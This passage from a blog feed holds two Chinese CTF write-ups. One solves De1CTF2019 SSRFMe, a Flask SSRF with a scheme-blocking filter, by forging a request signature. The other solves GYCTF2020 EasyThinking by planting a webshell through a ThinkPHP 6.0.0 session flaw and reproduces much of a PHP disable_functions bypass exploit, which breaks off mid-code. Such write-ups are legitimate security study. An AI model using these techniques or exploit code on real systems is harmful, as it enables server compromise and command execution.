class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            当action包含scan时,若param不存在则令result[data]=param</span></span><br><span class="line"><span class="string">            若存在则将param写入./sandbox/result.txt</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            当action包含read时,读取./sandbox/result的内容</span></span><br><span class="line"><span class="string">            作为result[data]的值</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断sign与getSign(action, param)是否相等</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/geneSign路由下,以get方式传入参数param,令action值为&#x27;scan&#x27;</span></span><br><span class="line"><span class="string">并调用getSign()函数进行处理</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/De1ta路由下,用get的方式传入参数action,sign,param,并对param进行waf过滤,ban掉了file和gopher协议</span></span><br><span class="line"><span class="string">通过过滤后创建一个task对象,然后返回其执行Exec()函数并json序列化后的内容，即序列化后的result数组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断指定的param是否存在,是则返回param,否则返回报错</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把secret_key,param,action拼接起来进行md5加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将传入的content进行md5加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#以gopher或file开头(忽略大小写)的param返回true，反之返回false</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目还有额外hint:<code>flag is in ./flag.txt</code>，结合题目名称，思路应该就是用SSRF的方式得到flag.txt文件的内容</p><p>Task()类中的Exec()函数对文件的访问做出了规定，因为flag.txt是已经存在的文件，故action=scan时是无法直接将flag提取出来，但该函数在进行对action的判断时，并没有严格区分scan与read，而是使用<code>in</code>的方式进行判断，这样只要action同时有read和scan就可以同时进行文件写入和读取并赋值给result数组</p><p>/geneSign路由的作用是生成相应的sign，这里action已经被固定写为scan，故需传<code>flag.txtread</code>，得到sign</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230420074.png" alt="image-20220110230420074"></p><p>在/De1ta路由下抓包，并将之前得到的sign与param，action以get方式传递，页面就会返回flag</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230708047.png" alt="image-20220110230708047"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 题目直接给出源码，是flask框架，进行审计，代码注释如下：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020-EasyThinking-writeup</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/</id>
    <published>2022-01-06T09:36:30.000Z</published>
    <updated>2022-01-07T06:00:20.755Z</updated>
    
    <content type="html"><![CDATA[<p> thinkphp-v6.0.0框架漏洞+disable_functions绕过</p><p>打开题目是一个简易网站，目录扫描发现在 <code>www.zip</code> 有源码泄露，下载下来</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png" alt="image-20220106175537402"></p><p>可以看出是thinkPHP框架搭建的，打个错误路径就能看到具体版本为6.0.0</p><p>谷歌6.0以上的thinkPHP漏洞，可以找到一个<a href="https://paper.seebug.org/1114/">thinkPHP6 session 任意文件操作漏洞</a></p><blockquote><p>2020年1月13号，<a href="https://www.uedbox.com/post/tag/thinkphp/">Thinkphp</a> 6.0.2发布，在详情页指出修复了一处<code>Session安全隐患</code>。经分析，该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以<a href="https://www.uedbox.com/post/tag/getshell/">getshell</a>。</p><p>具体受影响版本为ThinkPHP6.0.0-6.0.1。</p></blockquote><p>在源码app\home\controller路径下有Member.php文件，里面有一个关键函数search()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                    session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该函数会将key作为session中Record的值，这样就可以利用key这个可控的值来上传一句话木马</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106212749705.png" alt="image-20220106212749705"></p><p>上传后用蚁剑连接</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106213051067.png"></p><p>但是题目到这还没有结束，在根目录下找到/flag，进去后却没有flag的信息</p><p>/flag旁边有一个/readflag，大概率就是要通过它来获取flag</p><p>把key的内容换为phpinfo()，访问shell文件查看详细信息</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106232020235.png" alt="image-20220106232020235"></p><p>可以看到很多函数都被过滤掉，可以在<a href="https://github.com/mm0r1/exploits/tree/master">大佬的github</a>找到php7.0~7.4的通杀脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span 